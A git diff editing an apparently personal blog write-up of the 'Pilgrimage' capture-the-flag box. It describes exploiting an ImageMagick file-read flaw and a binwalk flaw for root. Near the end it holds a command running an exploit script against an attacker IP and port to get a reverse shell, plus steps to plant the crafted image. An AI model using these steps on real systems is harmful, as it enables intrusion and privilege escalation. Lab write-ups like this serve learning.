@@ -3,18 +3,19 @@ title: Pilgrimage
 date: 2023-11-25
 published: true
 categories: ["CTF"]
-tags: ["ctf",  "git", "CVE-2022-44268" ]
+tags: ["ctf",  "git", "CVE-2022-44268", "CVE-2022-4510"]
 ---
 # Pilgrimage
-This was a medium box that featured two cves.
+This was an easy  box that featured an unprotected git repository that we could use to see that it is using vulnerable
+software that we can use to read a sensitive file containing a password and then ssh into the box. Then we see that root 
+is running a custom script that was executing a vulnerable version of binwalk that we could use to get a shell as root.
 ## Recon
 ### nmap
-
+We see the ports 22 and 80 are open, so the only attack vector is the website, so we can go to the website.
 ![img.png](/assets/img/pilgrimage/img.png)
 
-We see the ports 22 and 80 are open, so we can  at the website and see what there is on the website.
 ### port 80
-We see that there is a host name we need to add to /etc/hosts before we can reach the website.We also can then 
+We see that there is a host name we need to add to /etc/hosts before we can reach the website. We also can then 
 fuzz for subdomains but that doesn't give us anything.
 
 ![img_1.png](/assets/img/pilgrimage/img_1.png)
@@ -27,17 +28,18 @@ the files that are stored in the git repository and then analyze the source code
 
 We see that in the git files there is the application called magick which is an application that does image processing 
 and if we look at the version we see that the version is 7.10-0-49 and that is vulnerable to
-[lfi](https://www.exploit-db.com/exploits/51261)
+[lfi](https://www.exploit-db.com/exploits/51261) which we can use to read sensitive files.
 
 ![img_3.png](/assets/img/pilgrimage/img_3.png)
 
 ### LFI
 
 If we go to the website we see that we register an account, and then we can upload an image that gets resized likely using 
-the magick application, so we can use the lfi to read files. If we look at the source code there is a /var/db/pilgrimage
-that is where the database is stored so if we can read that we might be able to get a password to log in with ssh so we 
-upload the malicious image which gets resized and triggers the exploit. Then we can read the data that using `identify -verbose image_name.png`
-and then converting the hex to the ascii equivalent.
+the magick application, so we can use the lfi to read files. If we look at the source code and in login.php the database 
+that is being used is stored in /var/db/pilgrimage so if we can read that we might be able to get a password to log in with ssh, so we 
+upload the malicious image which gets resized and triggers the exploit when it is resized. Then we can `wget http://pilgrimage.htb/shrunk/image_id`
+to get the image, and then we can read the data that using `identify -verbose image_name.png`
+and then converting the hex to the ascii equivalent to see if there is anything interesting.
 
 ![img_4.png](/assets/img/pilgrimage/img_4.png)
 
@@ -77,3 +79,5 @@ we see running `/usr/local/bin/binwalk` the version of binwalk is v2.3.2 and the
 the `python3 exp.py /var/www/pilgrimage.htb/shrunk/6561bb2e1406b.png 10.10.14.3 1234
 ` with exp.py being the exploit from the rce and then copy the created image to the /var/www/pilgrimage.htb/shrunk directory
 so that it triggers the inotify event create and executes the script and gives us a root privileges.
+
+![img_8.png](img_8.png)
